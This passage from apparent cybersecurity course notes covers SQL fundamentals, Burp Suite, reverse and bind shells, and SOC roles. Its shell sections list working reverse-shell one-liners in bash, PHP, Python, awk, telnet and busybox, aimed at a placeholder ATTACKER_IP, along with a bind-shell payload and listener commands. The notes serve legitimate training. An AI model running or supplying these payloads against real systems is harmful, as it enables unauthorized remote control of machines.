  * *Rules:* This creates the actual link between the two tables. A table can have **multiple** foreign keys. (e.g., placing an `author_id` in the Books table so it can link to the specific `id` in the Authors table).

### Key Takeaways
Understanding how Primary and Foreign keys link tables together is the absolute foundation of learning SQL. When you eventually learn SQL Injection, you will be using these structural rules to trick the database into handing over data from tables you aren't supposed to see!

**What is SQL?**

* **Objective:** Understand the role of a Database Management System (DBMS) and the core benefits of using Structured Query Language (SQL) to interact with relational data.



### Key Concepts: DBMS vs. SQL
It is important to understand the difference between the software that holds the data and the language used to speak to that software.

* **DBMS (Database Management System):** The software program that acts as the interface (the middleman) between the end user and the raw database. It is what actually executes the retrieval, updating, and management of the stored data.
* **DBMS Examples:** MySQL, Oracle Database, and MariaDB (which are relational), as well as MongoDB (which is a NoSQL, non-relational DBMS).
* **SQL (Structured Query Language):** The actual programming language you type into the DBMS. It is used exclusively to query, define, and manipulate data stored inside a *relational* database.

### Key Concepts: Benefits of SQL & Relational Databases
SQL is ubiquitous across the internet for several highly practical reasons:

* **Fast:** Relational databases use very little storage space and boast high processing speeds, allowing them to return massive batches of data almost instantaneously.
* **Easy to Learn:** Unlike highly complex programming languages, SQL syntax is highly readable and written in plain English (e.g., `SELECT * FROM Users`).
* **Reliable:** Because relational databases force data into a strict structure (like enforcing specific data types in a column), they guarantee a high level of accuracy and data integrity.
* **Flexible:** SQL provides incredibly robust capabilities for filtering and combining data, allowing analysts to perform vast data analysis tasks efficiently.

### Key Takeaways
If the database is a filing cabinet, the DBMS is the librarian, and SQL is the language you must speak to ask the librarian to fetch your files. Mastering SQL is non-negotiable for web application penetration testing, as manipulating it leads to one of the most devastating web vulnerabilities: SQL Injection.

**Database and Table Statements**

* **Objective:** Learn the fundamental SQL commands required to create, view, modify, and delete both databases and the tables within them.

### Database Statements
Before you can store data, you need to create and select a database to hold it. 

| Command | Syntax Example | Description |
| :--- | :--- | :--- |
| **CREATE DATABASE** | `CREATE DATABASE thm_bookmarket_db;` | Creates a brand new, empty database. |
| **SHOW DATABASES** | `SHOW DATABASES;` | Lists all databases currently present on the MySQL server. |
| **USE** | `USE thm_bookmarket_db;` | Tells the system which database you want to actively interact with. *Must be run before creating tables!* |
| **DROP DATABASE** | `DROP DATABASE thm_bookmarket_db;` | Permanently deletes a database and all of its contents. |



### Table Statements
Once your database is active (via the `USE` command), you can start building the structures (tables) that will hold your actual data.

| Command | Syntax Example | Description |
| :--- | :--- | :--- |
| **CREATE TABLE** | `CREATE TABLE book_inventory (book_id INT PRIMARY KEY, book_name VARCHAR(255));` | Creates a new table and defines its specific columns and data types. |
| **SHOW TABLES** | `SHOW TABLES;` | Lists all tables contained within the currently active database. |
| **DESCRIBE** | `DESCRIBE book_inventory;` | Outputs the detailed schema of a table (columns, data types, and keys). Can also be abbreviated as `DESC`. |
| **ALTER** | `ALTER TABLE book_inventory ADD page_count INT;` | Modifies an existing table (e.g., adding a new column, renaming a column, or changing a data type). |
| **DROP TABLE** | `DROP TABLE book_inventory;` | Permanently deletes a table and all of the rows inside it. |



### Key Concepts: Data Types and Constraints
When using `CREATE TABLE`, you must explicitly define what kind of data each column can hold, and enforce rules (constraints) on that data.

* **INT:** Integer. The column will only accept whole numbers.
* **VARCHAR(255):** Variable Character. Accepts text, numbers, and punctuation up to a specified limit (255 characters in this case).
* **DATE:** Forces the data to be formatted as a date (YYYY-MM-DD).
* **PRIMARY KEY:** A constraint that forces the column to be the unique identifier for that specific row.
* **AUTO_INCREMENT:** Automatically assigns the next sequential number to a new record (e.g., 1, 2, 3), ensuring IDs are always unique without manual input.
* **NOT NULL:** A constraint that rejects any record attempting to leave this specific column blank.

### Tools & Commands
* **MySQL Command Line:** The interface where you type these SQL queries to interact with the Database Management System (DBMS).

### Key Takeaways
Always remember to run the `USE [database_name];` command before trying to create a table. If you don't tell the DBMS which database you are pointing at, it will throw an error when you try to run your `CREATE TABLE` statement!

**SQL CRUD**
* **Objective:** Master the four foundational operations—Create, Read, Update, and Delete (CRUD)—used to manage and manipulate records inside a relational database.



### Key Concepts: The CRUD Acronym
Every system that manages data relies on these four basic functions. In SQL, each CRUD operation maps to a specific command.

| CRUD Operation | SQL Statement | Example Syntax | Description |
| :--- | :--- | :--- | :--- |
| **Create** | `INSERT INTO` | `INSERT INTO books (id, name) VALUES (1, "Android");` | Adds a brand new record (row) to a specific table. |
| **Read** | `SELECT` | `SELECT * FROM books;` | Retrieves and reads information from the table. |
| **Update** | `UPDATE` | `UPDATE books SET description = "Updated" WHERE id = 1;` | Modifies an existing record that is already in the table. |
| **Delete** | `DELETE` | `DELETE FROM books WHERE id = 1;` | Permanently removes a record from the table. |

### Crucial SQL Clauses and Syntax
To make the CRUD statements work effectively (and safely), you have to combine them with specific clauses.

* **`VALUES` (Used with INSERT):** Dictates the exact data being dropped into the columns you specified. The order of your values *must* match the order of the columns you listed.
* **`*` (The Wildcard):** When used with `SELECT` (e.g., `SELECT * FROM books;`), it tells the database to return *all* columns for the requested records. If you only want specific data, replace the `*` with the column names (e.g., `SELECT name, description FROM books;`).
* **`FROM` (Used with SELECT and DELETE):** Tells the database exactly which table to pull from or delete from.
* **`SET` (Used with UPDATE):** Specifies the exact column you are changing and the new value you are assigning to it.
* **`WHERE` (Used with UPDATE and DELETE):** The targeting system. It tells the database exactly which row(s) to apply the changes to (e.g., `WHERE id = 1`).

### Tools & Commands
* **MySQL Command Line:** The interface where you type these CRUD queries to manipulate the active database.

### Key Takeaways
**Security & Admin Warning:** Always double-check your `WHERE` clause when using `UPDATE` or `DELETE`! If you run `UPDATE books SET name = "Hacked";` without a `WHERE` clause to target a specific ID, the DBMS will overwrite the name of *every single book* in your entire database!

**Clauses**

* **Objective:** Learn how to refine your SQL queries to filter out duplicates, aggregate information, and sort your results using `DISTINCT`, `GROUP BY`, `ORDER BY`, and `HAVING`.

### Key Concepts: Advanced SQL Clauses
While the `WHERE` clause filters data *before* it gets retrieved, these advanced clauses help you define exactly how that data should be grouped, sorted, and presented.



| Clause | Purpose | Example Syntax |
| :--- | :--- | :--- |
| **DISTINCT** | Removes duplicate records from the query output, returning only unique values. | `SELECT DISTINCT name FROM books;` |
| **GROUP BY** | Aggregates identical data into single rows. Usually paired with functions like `COUNT()`. | `SELECT name, COUNT(*) FROM books GROUP BY name;` |
| **ORDER BY** | Sorts the returned records based on a specific column. Can be ascending (`ASC`) or descending (`DESC`). | `SELECT * FROM books ORDER BY published_date DESC;` |
| **HAVING** | Filters grouped records *after* an aggregation (like `COUNT`) has taken place. | `... GROUP BY name HAVING name LIKE '%Hack%';` |




### Syntax Breakdown & Examples

* **Using DISTINCT:** If you have multiple books with the exact same name, this ensures the name only prints once.
  * `SELECT DISTINCT name FROM books;`
* **Using GROUP BY:** If you want to know exactly how many copies of each book you have, you group them by name and count the occurrences.
  * `SELECT name, COUNT(*) FROM books GROUP BY name;`
* **Using ORDER BY:** If you want to see your newest books first, sort them by the publication date in descending order.
  * `SELECT * FROM books ORDER BY published_date DESC;`
* **Using HAVING:** If you only want to see grouped books that have the word "Hack" in the title, use `HAVING` combined with the `LIKE` operator.
  * `SELECT name, COUNT(*) FROM books GROUP BY name HAVING name LIKE '%Hack%';`



### Tools & Commands
* **MySQL Command Line:** The interface used to execute these queries against the active database.

### Key Takeaways
**The difference between `WHERE` and `HAVING`:** This is a classic interview question! `WHERE` filters individual rows *before* they are grouped together. `HAVING` filters the results *after* they have been aggregated by `GROUP BY`.

**Operators**
* **Objective:** Learn how to use Logical and Comparison operators to create precise, powerful filters for manipulating and retrieving data.

### Logical Operators
These operators test specific conditions and return a boolean value (`TRUE` or `FALSE`). They are usually combined with the `WHERE` clause.

| Operator | Purpose | Example Syntax |
| :--- | :--- | :--- |
| **LIKE** | Filters for a specific pattern within a string. The `%` symbol acts as a wildcard. | `WHERE description LIKE "%guide%";` (Finds any description containing the word "guide"). |
| **AND** | Combines multiple conditions; returns `TRUE` only if *all* conditions are met. | `WHERE category = "Offensive" AND name = "Bug Bounty";` |
| **OR** | Combines multiple conditions; returns `TRUE` if *at least one* condition is met. | `WHERE name LIKE "%Android%" OR name LIKE "%iOS%";` |
| **NOT** | Reverses a boolean value to exclude a specific condition. | `WHERE NOT description LIKE "%guide%";` |
| **BETWEEN** | Tests if a numerical or date value exists within a defined range. | `WHERE id BETWEEN 2 AND 4;` |

### Comparison Operators
These operators compare values to check if they meet strict mathematical criteria. They are essential for filtering dates, IDs, or exact string matches.

| Operator | Purpose | Example Syntax |
| :--- | :--- | :--- |
| **`=`** | **Equal To:** Checks for an exact match. | `WHERE name = "Designing Secure Software";` |
| **`!=`** | **Not Equal To:** Returns all records that do *not* match the given value. | `WHERE category != "Offensive Security";` |
| **`<`** | **Less Than:** Returns values strictly lower than the provided threshold. | `WHERE published_date < "2020-01-01";` |
| **`>`** | **Greater Than:** Returns values strictly higher than the provided threshold. | `WHERE published_date > "2020-01-01";` |
| **`<=`** | **Less Than or Equal To:** Includes the provided threshold in the lower range. | `WHERE published_date <= "2021-11-15";` |
| **`>=`** | **Greater Than or Equal To:** Includes the provided threshold in the upper range. | `WHERE published_date >= "2021-11-02";` |

### Tools & Commands
* **MySQL Command Line:** Used to execute these queries and test operator logic.

### Key Takeaways
Mastering operators is crucial for security analysts! When hunting through massive databases (or trying to craft complex SQL Injection payloads), combining `LIKE` with wildcards (`%`) or chaining `AND`/`OR` logic allows you to pinpoint exact records instantly.

**Functions**

### String Functions
String functions perform operations on text-based data, allowing you to slice, combine, and measure strings directly within your query output.

| Function | Purpose | Example Syntax |
| :--- | :--- | :--- |
| **CONCAT()** | Merges two or more strings together into a single continuous string. | `SELECT CONCAT(name, " is a ", category) AS book_info FROM books;` |
| **GROUP_CONCAT()** | Concatenates data from multiple *rows* into one single field, usually combined with a `GROUP BY` clause. | `SELECT category, GROUP_CONCAT(name SEPARATOR ", ") FROM books GROUP BY category;` |
| **SUBSTRING()** | Extracts a specific chunk of text from a string by defining a starting position and a length limit. | `SELECT SUBSTRING(published_date, 1, 4) AS published_year FROM books;` |
| **LENGTH()** | Returns the total number of characters in a string, including all spaces and punctuation. | `SELECT LENGTH(name) AS name_length FROM books;` |

### Aggregate Functions
Aggregate functions take values from multiple rows and combine them into a single, calculated result. 

| Function | Purpose | Example Syntax |
| :--- | :--- | :--- |
| **COUNT()** | Returns the total number of records (rows) that exist within a specified criteria. | `SELECT COUNT(*) AS total_books FROM books;` |
| **SUM()** | Calculates the total mathematical sum of all non-NULL values in a specific column. | `SELECT SUM(price) AS total_price FROM books;` |
| **MAX()** | Retrieves the absolute highest (maximum) value found within a provided column. | `SELECT MAX(published_date) AS latest_book FROM books;` |
| **MIN()** | Retrieves the absolute lowest (minimum) value found within a provided column. | `SELECT MIN(published_date) AS earliest_book FROM books;` |

### Key Concepts: Aliasing with `AS`
You will notice the `AS` keyword used in almost all of these examples (e.g., `AS total_books`). This is called **Aliasing**. When you perform a function on a column, SQL will normally make the column header look messy (like `COUNT(*)`). Using `AS` allows you to temporarily rename the output column to something clean and readable!

### Tools & Commands
* **MySQL Command Line:** Used to execute these queries and test function logic.

### Key Takeaways
Functions like `SUBSTRING()` and `CONCAT()` are incredibly useful during security assessments. If an attacker finds a SQL Injection vulnerability, they will often use `CONCAT()` to merge a username and a password into a single string so they can easily extract both pieces of data at the same time!

---

## Room: [Burp Suite: The Basics]

**Introduction to Burp Suite**

* **Objective:** Understand what Burp Suite is, its core capability of intercepting web traffic, and the differences between its Community, Professional, and Enterprise editions.

### Key Concepts: Burp Suite Fundamentals
Burp Suite is an absolute staple in cybersecurity. It is a Java-based framework that serves as the industry standard for hands-on web application and API penetration testing.



* **The Core Engine (Interception):** At its heart, Burp Suite acts as a web proxy. It sits directly between your web browser and the target web server, capturing all HTTP and HTTPS traffic. This allows you to pause, view, and manually modify web requests *before* they reach the server, or manipulate responses *before* your browser loads them.

### Key Concepts: Burp Suite Editions
There are three main versions of the software, each tailored for different use cases and budgets.


* **Community Edition:** The free version accessible for non-commercial learning and legal hacking. It contains the essential manual testing tools but restricts or throttles automated features.
* **Professional Edition:** The unrestricted, paid version used by security professionals. It includes an automated vulnerability scanner, an un-throttled brute-forcer/fuzzer, project saving, reporting, unrestricted extensions, and access to the **Burp Collaborator** (a powerful tool for catching out-of-band, blind vulnerabilities).
* **Enterprise Edition:** Unlike the desktop versions used for manual hacking, this is a server-hosted version designed for continuous, automated vulnerability scanning across an organization's web applications (similar to how Nessus scans infrastructure).

### Key Takeaways
Burp Suite's true power lies in its ability to freeze web traffic mid-flight. By intercepting a request, you can easily bypass client-side restrictions (like JavaScript form validation in the browser) and send malicious payloads directly to the backend server!

**Features**

### Core Burp Suite Tools
Even with the Community Edition's rate limits, these built-in tools provide everything you need for extensive manual web application testing.

| Tool | Primary Function | Use Case |
| :--- | :--- | :--- |
| **Proxy** | The backbone of Burp Suite. Intercepts and holds web traffic between your browser and the server. | Modifying a request (like changing a price or user ID) before it reaches the target application. |
| **Repeater** | Allows you to capture a single request, modify it, and resend it over and over again manually. | Trial and error testing! Perfect for slowly tweaking a SQL Injection (SQLi) payload until it bypasses the firewall. |
| **Intruder** | Sprays an endpoint with automated requests using customized payloads. *(Note: Heavily rate-limited in Community Edition).* | Brute-forcing login pages or fuzzing directories to find hidden endpoints. |
| **Decoder** | A data transformation tool used to quickly encode or decode strings. | Decoding a base64 session cookie, or URL-encoding an XSS payload so the server accepts it. |
| **Comparer** | Compares two distinct pieces of data to highlight exact differences at the word or byte level. | Comparing a successful login response side-by-side with a failed login response to spot hidden discrepancies. |
| **Sequencer** | Analyzes the statistical randomness of tokens generated by the web application. | Testing session cookies or password reset tokens to see if they are predictable enough to forge. |


### Extending Burp Suite
Burp Suite is highly customizable. Because it is written in Java, you can load powerful third-party extensions to give the framework entirely new features.

* **Supported Languages:** Extensions can be written in Java, Python (using the Jython interpreter), or Ruby (using the JRuby interpreter).
* **Extender Module:** The interface used to quickly load and manage your active extensions.
* **BApp Store:** The official marketplace built directly into Burp Suite where you can browse and download community-made modules.
* **Popular Extension Example:** **Logger++** is frequently used to expand and improve Burp Suite's default logging functionality.

### Key Takeaways
**Repeater** will become your absolute best friend during manual testing. Instead of clicking through a website's interface every time you want to test a new payload, you can just send the request to Repeater and fire off dozens of variations in seconds!

---

## Room: [Shells Overview]

* **Objective:** Understand what a shell is in the context of an operating system, and how attackers leverage shell sessions to control compromised systems.

### Key Concepts: The Shell
* **Definition:** A shell is a piece of software that allows a user to interact with the Operating System (OS). While graphical user interfaces (GUIs) technically count, in cybersecurity, "shell" almost universally refers to a **Command-Line Interface (CLI)**.

* **The Attacker's Shell:** When a hacker says they "popped a shell," it means they successfully exploited a vulnerability and established a session on the target. This session allows them to type commands directly into the compromised machine as if they were sitting right in front of the keyboard.

### Post-Exploitation: What Happens After You Get a Shell?
Gaining an initial shell is rarely the end of the attack; it's usually just the beginning. Attackers use this access to perform several critical activities:

* **Remote System Control:** The baseline capability. The attacker can execute built-in OS commands, run software, and explore the file system remotely.
* **Privilege Escalation:** Initial shells often land as low-privileged, restricted users (like a standard web server service account). Attackers will immediately hunt for misconfigurations to elevate their access to `root` (Linux) or `Administrator` / `SYSTEM` (Windows).
* **Data Exfiltration:** Searching the system for sensitive data, credentials, or proprietary information, packaging it up, and stealing it.
* **Persistence:** Attackers want to maintain their access even if the server is rebooted or the initial vulnerability is patched. They achieve this by creating hidden user accounts, adding scheduled tasks, or dropping backdoor software.
* **General Post-Exploitation:** A broad category that includes deploying malware, modifying system configurations, and deleting log files to cover their tracks.
* **Pivoting (Lateral Movement):** The compromised host is used as a launchpad to attack deeper, internal systems on the network that the attacker couldn't reach directly from the outside internet.

### Key Takeaways
An initial shell is just a foothold. The real impact of a cyber attack happens during the persistence, privilege escalation, and pivoting phases once the attacker is safely inside the network perimeter.

**Reverse Shell**
* **Objective:** Understand how a Reverse Shell operates, how to set up a Netcat listener, and how to analyze a standard Linux reverse shell payload.

### Key Concepts: The Reverse Shell
A reverse shell (or "connect back shell") is the most popular technique for gaining access to a system. Instead of the attacker connecting *to* the target, the attacker forces the target to initiate a connection *back* to the attacker's machine.



* **Why use it?** Most network firewalls heavily restrict *inbound* traffic but are much more lenient on *outbound* traffic. By making the target reach out to the attacker (especially on common ports like 80 or 443), the connection easily slips past the firewall.

### Step 1: Setting up the Listener (Netcat)
Before executing the payload on the target, the attacker must set up a machine to "catch" the incoming connection using Netcat (`nc`).

* **Example Command:** `nc -lvnp 443`

| Netcat Flag | Purpose |
| :--- | :--- |
| **`-l`** | **Listen:** Tells Netcat to listen for an incoming connection rather than initiating one. |
| **`-v`** | **Verbose:** Provides detailed output when the connection is established. |
| **`-n`** | **Numeric:** Prevents DNS lookups, forcing Netcat to use raw IP addresses (speeds up the connection). |
| **`-p`** | **Port:** Specifies the exact port to listen on (e.g., 443). |

### Step 2: Executing the Payload
Once the listener is running, the attacker exploits a vulnerability on the target to execute the payload. This payload exposes the target's shell (`sh` or `bash`) over the network.

* **Example Named Pipe Payload:** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

| Payload Segment | Explanation |
| :--- | :--- |
| `rm -f /tmp/f;` | Removes any existing file named `f` in the `/tmp` directory to prevent conflicts. |
| `mkfifo /tmp/f;` | Creates a new "Named Pipe" (FIFO) at `/tmp/f` to act as a two-way communication conduit. |
| `cat /tmp/f` | Reads incoming data (attacker commands) from the named pipe. |
| `\| sh -i 2>&1` | Pipes that data into an interactive shell (`sh -i`). The `2>&1` ensures error messages are also captured. |
| `\| nc IP PORT` | Pipes the shell's output through Netcat directly back to the attacker's machine. |
| `>/tmp/f` | Redirects the final output back into the named pipe, completing the continuous bi-directional loop. |

### Tools & Commands
* **Netcat (`nc`):** Often referred to as the "Swiss Army Knife" of networking. Used here to open a listening port to catch the reverse shell.

### Key Takeaways
Always double-check your IP address and Port when modifying a reverse shell payload! If you specify the wrong IP, the target will send the shell out into the void, and you will be left staring at a blank Netcat listener wondering why the exploit "failed."

**Bind Shell**

* **Objective:** Understand how a Bind Shell operates, when it is used over a reverse shell, and how to analyze a standard Linux bind shell payload.

### Key Concepts: The Bind Shell
A bind shell does exactly what its name implies: it *binds* a specific port on the compromised target machine and sits there listening, waiting for the attacker to connect to it. 

* **When to use it:** Bind shells are useful when the target network strictly blocks *outbound* connections (making a reverse shell impossible), but allows *inbound* connections.
* **The Drawback:** They are generally less popular than reverse shells because leaving a random port open and listening on a server is highly suspicious and easily detected by defenders or host-based firewalls.

### Step 1: Setting up the Bind Shell (Target Machine)
The attacker exploits a vulnerability to execute a payload on the target. This payload opens a listening port and attaches a shell (`bash`) to it.

* **Example Named Pipe Payload:** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`

| Payload Segment | Explanation |
| :--- | :--- |
| `rm -f /tmp/f;` | Removes any existing file named `f` in the `/tmp` directory to prevent conflicts. |
| `mkfifo /tmp/f;` | Creates a new "Named Pipe" (FIFO) at `/tmp/f` to act as a two-way communication conduit. |
| `cat /tmp/f` | Reads incoming data (commands sent by the attacker) from the named pipe. |
| `\| bash -i 2>&1` | Pipes that data into an interactive shell (`bash -i`). The `2>&1` ensures error messages are returned to the attacker. |
| `\| nc -l 0.0.0.0 8080` | Starts Netcat in **listen mode (`-l`)** on all interfaces (`0.0.0.0`) on port `8080`. *This is where it waits for the attacker.* |
| `>/tmp/f` | Redirects the shell's output back into the named pipe, completing the bi-directional loop. |

* **Privilege Note:** Opening a port below `1024` (like port `80` or `443`) requires `root`/Administrator privileges on the target. Using a higher port like `8080` or `4444` bypasses this restriction for low-privileged users.

### Step 2: Connecting to the Bind Shell (Attacker Machine)
Once the target is actively listening, the attacker simply connects to the target's IP address and the specified port using Netcat.

* **Example Command:** `nc -nv TARGET_IP 8080`

| Netcat Flag | Purpose |
| :--- | :--- |
| **`nc`** | Invokes Netcat to establish the connection. |
| **`-n`** | **Numeric:** Disables DNS resolution to speed up the connection and avoid generating DNS logs. |
| **`-v`** | **Verbose:** Provides detailed output confirming that the connection to the open port was successful. |

### Tools & Commands
* **Netcat (`nc`):** Used on the target to *listen* (`-l`), and used on the attacker machine to *connect*.

### Key Takeaways
**The Golden Rule of Shells:** * **Reverse Shell:** The Attacker listens (`nc -lvnp`), the Target connects.
* **Bind Shell:** The Target listens (`nc -l`), the Attacker connects (`nc -nv`).

**Shell Listeners**

* **Objective:** Learn how to use advanced listener utilities beyond basic Netcat (`nc`) to improve interaction quality and encrypt your shell traffic.

### Key Concepts: The Problem with Basic Netcat
While standard Netcat (`nc -lvnp 443`) is great for initially catching a reverse shell, it is incredibly unstable. By default, you cannot use the arrow keys to edit typos, you cannot use the up-arrow to view command history, and if you accidentally press `Ctrl+C`, it will kill your entire shell session. Furthermore, the traffic is sent in plaintext, meaning network defenders can see everything you type.

### Alternative Listener Utilities

| Utility | Primary Benefit | Command Example | Explanation |
| :--- | :--- | :--- | :--- |
| **Rlwrap** | **Quality of Life:** Wraps standard Netcat to provide command history and allow the use of arrow keys for editing text. | `rlwrap nc -lvnp 443` | You execute `rlwrap` and pass the standard `nc` command as an argument. |
| **Ncat** | **Security:** The Nmap Project's modernized version of Netcat. It supports SSL encryption to hide your shell traffic from network defenders. | `ncat --ssl -lvnp 443` | The `--ssl` flag automatically generates a temporary certificate and encrypts the reverse shell connection. |
| **Socat** | **Stability & Features:** An incredibly powerful utility for creating socket connections. It can create fully interactive, highly stable TTY shells. | `socat -d -d TCP-LISTEN:443 STDOUT` | `-d -d` enables high verbosity. `TCP-LISTEN:443` opens the port, and `STDOUT` directs the target's output directly to your terminal screen. |

### Tools & Commands
* **`rlwrap`**: A simple GNU readline wrapper. (Often needs to be installed via `apt install rlwrap` on fresh Linux builds).
* **`ncat`**: Included by default if Nmap is installed on the system.
* **`socat`**: A more complex but much more stable networking utility.

### Key Takeaways
If you ever catch a shell using standard Netcat and accidentally type a command wrong, **do not press Ctrl+C** to cancel it! It will kill the listener and you will lose your shell. Always try to catch shells using `rlwrap nc` to save yourself from that headache.

**Shell Payloads**

* **Objective:** Learn the syntax for various Linux reverse shell payloads across different languages and utilities. These commands are executed on the compromised target to send a shell connection back to the attacker's listener.

### Key Concepts: Payload Selection
You cannot always rely on Netcat being installed on a target server. A skilled attacker knows how to "live off the land" by using the tools and languages that are already installed on the target machine (like Python, PHP, or Bash) to execute their reverse shell.

### 1. Bash Reverse Shells
If the target is running a standard Linux environment, Bash is almost always available.

| Payload Type | Command Syntax |
| :--- | :--- |
| **Standard Bash** | `bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1` |
| **Read Line** | `exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 \| while read line; do $line 2>&5 >&5; done` |
| **File Descriptor (196)** | `0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196` |
| **File Descriptor (5)** | `bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5` |

### 2. PHP Reverse Shells
Often used when exploiting web application vulnerabilities (like file uploads or code injection), as web servers frequently have PHP installed.

| Payload Type | Command Syntax |
| :--- | :--- |
| **Using `exec`** | `php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'` |
| **Using `shell_exec`** | `php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'` |
| **Using `system`** | `php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'` |
| **Using `passthru`** | `php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'` |
| **Using `popen`** | `php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'` |

### 3. Python Reverse Shells
Python is incredibly common on modern Linux servers. *(Note: `PY-C` in the examples below represents `python -c` or `python3 -c`).*

| Payload Type | Command Syntax |
| :--- | :--- |
| **Exporting Env Variables** | `export RHOST="ATTACKER_IP"; export RPORT=443; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'` |
| **Subprocess Module** | `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'` |
| **Short Version** | `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'` |

### 4. Other Utilities (Living off the Land)
When standard scripting languages fail, you can try these alternative utilities.

| Payload Type | Command Syntax | Description |
| :--- | :--- | :--- |
| **Telnet** | `TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF \| sh 1>$TF` | Uses Telnet and a named pipe to route the shell traffic. |
| **AWK** | `awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" \|& s; s \|& getline c; if(c){ while ((c \|& getline) > 0) print $0 \|& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` | Abuses the built-in TCP networking capabilities of the AWK text processing tool. |
| **BusyBox** | `busybox nc ATTACKER_IP 443 -e sh` | Commonly found on embedded systems and IoT devices. Uses a lightweight version of Netcat. |

### Key Takeaways
If a Bash reverse shell fails, don't give up! The server might have restricted outbound bash connections but left Python or PHP completely unrestricted. Always cycle through different payload types when trying to pop a shell.

## Room: [SQLMap: The Basics]

**SQLMap**

* SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying these vulnerabilities. This tool is built into some Linux distributions, but you can easily install it if it's not.

---

## Room: [SOC Fundamentals]

* Security Operations Center (SOC) is a team of IT security professionals tasked with monitoring, preventing, detecting, investigating, and responding to threats within a company's network and systems.

* **Objective:** Understand the primary responsibilities of a Security Operations Center (SOC) and the three foundational elements required to make it mature and efficient.

### 1. The Primary Focus: Detection and Response
A SOC relies on continuous monitoring from a centralized location to keep the company's network secure. Their core mission is split into two main phases.



**Phase 1: Detection**
The SOC is constantly hunting for anomalies and weaknesses. This includes:
* **Detecting Vulnerabilities:** Identifying unpatched software, operating systems, or programs before attackers can exploit them. 
* **Detecting Unauthorized Activity:** Spotting compromised accounts (e.g., catching a login from an impossible geographic location using stolen employee credentials).
* **Detecting Policy Violations:** Catching internal users breaking corporate security rules (e.g., downloading pirated media or emailing confidential files insecurely).
* **Detecting Intrusions:** Identifying successful breaches, such as an exploited web server or an employee's computer getting infected with malware.

**Phase 2: Response**
Once a threat is detected, the SOC must act quickly to neutralize it.
* **Incident Response Support:** The SOC helps contain the threat to minimize business impact and performs a root-cause analysis to figure out exactly how the incident occurred.

---

### 2. The Three Pillars of a SOC
A SOC cannot function on software alone. To effectively detect and respond to incidents, a SOC must perfectly balance three critical elements:



| Pillar | Description |
| :--- | :--- |
| **People** | A dedicated team of highly trained, professional security analysts and engineers. |
| **Process** | The established rules, procedures, and playbooks that dictate exactly how the team should handle specific alerts and incidents to ensure compliance and efficiency. |
| **Technology** | The state-of-the-art security solutions and centralized monitoring tools used to sift through massive amounts of network data. |

**Key Takeaway:** You can buy the most expensive **Technology** in the world, but without the right **People** to configure it and the proper **Processes** to respond to its alerts, your SOC will inevitably fail.

**People**

* **Objective:** Understand why human analysts are essential to a Security Operations Center and learn the specific responsibilities of the different roles within the SOC hierarchy.

### Key Concepts: The "Noise" Problem (Alert Fatigue)
Security solutions and automated tools are great, but they generate a massive amount of "noise" (red flags/alerts). 
* **The Fire Brigade Analogy:** If a city's automated fire alarm system alerts the fire department every time someone burns toast, the department wastes all its time and resources on false alarms. 
* **The Human Element:** In a SOC, automated tools will flag a lot of harmless activity as "suspicious." It requires the **People** on the team to manually investigate these alerts, filter out the false positives, and identify the truly harmful activities.

### The SOC Team Structure
A mature SOC operates on a tiered escalation path. When an alert fires, it moves up the chain based on its severity and complexity.

| Role | Primary Responsibilities |
| :--- | :--- |
| **SOC Analyst (Level 1)** | **The First Responders:** They perform the initial triage on every alert generated by the security tools to determine if it is a false positive or a real threat. If it's a real threat, they escalate it. |
| **SOC Analyst (Level 2)** | **The Deep Divers:** They handle the escalated alerts from Level 1. They dive deeper into the investigation, correlating data from multiple sources (like firewalls, endpoints, and proxies) to perform a proper, comprehensive analysis. |
| **SOC Analyst (Level 3)** | **The Threat Hunters & Responders:** Highly experienced professionals who *proactively* hunt for hidden threats that the automated tools missed. They also handle complex Incident Response (Containment, Eradication, Recovery) for critical breaches. |
| **Security Engineer** | **The Builders:** They deploy, configure, and maintain the actual security solutions (SIEMs, Firewalls, EDRs) to ensure they operate smoothly and ingest data correctly. |
| **Detection Engineer** | **The Rule Makers:** They write the custom logic and security rules that power the automated tools, telling the software exactly what malicious activity looks like. *(Note: L2 or L3 analysts sometimes wear this hat).* |
| **SOC Manager** | **The Leader:** Manages the team's processes, oversees daily operations, and reports the overall security posture and metrics up to the executive level (the CISO). |

### Key Takeaways
If you are aiming for a career as a SOC Analyst, you will almost certainly start at **Level 1**. Your primary job will be "Alert Triage"—quickly looking at an automated warning and deciding: "Is this just a user forgetting their password 5 times, or is this an attacker trying to brute-force an account?"

**Process**

## Task: The "Process" Pillar - Alert Triage and Incident Response

* **Objective:** Understand the standard operating procedures a SOC team uses to investigate, report, and respond to security alerts.

### Key Concepts: Alert Triage and The 5 Ws
Alert triage is the foundational process of a SOC. When an automated security tool generates a red flag, a Level 1 Analyst must immediately investigate it to determine its severity and priority. 

